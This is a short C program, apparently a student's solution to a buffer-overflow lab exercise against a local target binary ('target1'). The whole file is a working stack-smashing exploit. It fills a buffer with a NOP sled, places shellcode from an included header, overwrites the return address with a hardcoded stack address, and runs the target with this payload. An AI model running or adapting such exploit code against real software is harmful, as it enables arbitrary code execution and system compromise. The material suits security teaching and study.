#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define NOP '\x90'
#define ADDR 0x3021fe50

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char exploit[125];
	
	int i=0;
	for(i=0;i<125;i++){
		exploit[i] = NOP;
	}
	for(i=75;i<120;i++){
		exploit[i]=shellcode[i-75];
	}
	
	exploit[120] = '\x50';
	exploit[121] = '\xfe';
	exploit[122] = '\x21';
	exploit[123] = '\x30';
	exploit[124] = '\0';
	
	args[0] = TARGET;
	args[1] = exploit;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
